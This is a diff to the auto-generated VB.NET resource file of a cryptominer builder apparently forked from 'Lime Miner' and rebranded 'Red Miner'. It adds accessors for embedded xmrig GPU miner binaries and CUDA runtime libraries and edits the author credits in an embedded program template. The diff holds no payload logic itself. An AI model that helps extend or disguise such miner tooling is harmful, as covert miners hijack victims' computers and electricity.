@@ -61,6 +61,26 @@ Namespace My.Resources
         End Property
         
         '''<summary>
+        '''  Looks up a localized resource of type System.Byte[].
+        '''</summary>
+        Friend ReadOnly Property nvrtc_builtins64_90() As Byte()
+            Get
+                Dim obj As Object = ResourceManager.GetObject("nvrtc_builtins64_90", resourceCulture)
+                Return CType(obj,Byte())
+            End Get
+        End Property
+        
+        '''<summary>
+        '''  Looks up a localized resource of type System.Byte[].
+        '''</summary>
+        Friend ReadOnly Property nvrtc64_90() As Byte()
+            Get
+                Dim obj As Object = ResourceManager.GetObject("nvrtc64_90", resourceCulture)
+                Return CType(obj,Byte())
+            End Get
+        End Property
+        
+        '''<summary>
         '''  Looks up a localized resource of type System.Drawing.Bitmap.
         '''</summary>
         Friend ReadOnly Property nyan() As System.Drawing.Bitmap
@@ -73,10 +93,10 @@ Namespace My.Resources
         '''<summary>
         '''  Looks up a localized string similar to 
         '''
-        '''&apos;       │ Author     : NYAN CAT
-        '''&apos;       │ Name       : Lime Miner
-        '''
-        '''&apos;       Contact Me    https : //github.com/NYAN-x-CAT
+        '''&apos;       │ Original Author     : NYAN CAT
+        '''&apos;       │ Original Name       : Lime Miner
+        '''&apos;       │ New Name            : Red Miner
+        '''&apos;       Original Contact Me    https : //github.com/NYAN-x-CAT
         '''
         '''&apos;       This program Is distributed for educational purposes only.
         '''
@@ -89,10 +109,7 @@ Namespace My.Resources
         '''Imports Microsoft.VisualBasic
         '''Imports System.Diagnostics
         '''Imports System.Reflection
-        '''Imports System.Runtime.InteropServices
-        '''Imports System.Collections.Generic
-        '''Imports System.Drawing
-        '''Imports Sy [rest of string was truncated]&quot;;.
+        '''Imports System.Runtim [rest of string was truncated]&quot;;.
         '''</summary>
         Friend ReadOnly Property Program() As String
             Get
@@ -116,6 +133,26 @@ Namespace My.Resources
         Friend ReadOnly Property xmrig() As Byte()
             Get
                 Dim obj As Object = ResourceManager.GetObject("xmrig", resourceCulture)
+                Return CType(obj,Byte())
+            End Get
+        End Property
+        
+        '''<summary>
+        '''  Looks up a localized resource of type System.Byte[].
+        '''</summary>
+        Friend ReadOnly Property xmrig_amd_notls() As Byte()
+            Get
+                Dim obj As Object = ResourceManager.GetObject("xmrig_amd_notls", resourceCulture)
+                Return CType(obj,Byte())
+            End Get
+        End Property
+        
+        '''<summary>
+        '''  Looks up a localized resource of type System.Byte[].
+        '''</summary>
+        Friend ReadOnly Property xmrig_nvidia9() As Byte()
+            Get
+                Dim obj As Object = ResourceManager.GetObject("xmrig_nvidia9", resourceCulture)
                 Return CType(obj,Byte())
             End Get
         End Property
